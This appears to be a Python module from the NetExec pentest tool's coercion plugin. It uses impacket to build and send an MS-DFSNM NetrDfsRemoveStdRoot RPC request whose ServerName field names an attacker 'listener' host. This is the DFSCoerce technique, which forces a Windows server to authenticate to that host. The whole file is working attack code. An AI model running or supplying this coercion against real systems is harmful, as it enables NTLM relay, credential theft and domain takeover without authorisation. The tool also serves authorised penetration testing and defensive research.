from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD

from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError


class NetrDfsRemoveStdRoot(NDRCALL):
    """Structure to make the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol"""
    opnum = 13
    structure = (
        ("ServerName", WSTR),  # Type: WCHAR *
        ("RootShare", WSTR),   # Type: WCHAR *
        ("ApiFlags", DWORD)    # Type: DWORD
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    """Structure to parse the response of the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol"""
    structure = ()


def request(dce, target, listener):
    request = NetrDfsRemoveStdRoot()
    request["ServerName"] = f"{listener}\x00"
    request["RootShare"] = "test\x00"
    request["ApiFlags"] = 0
    dce.request(request)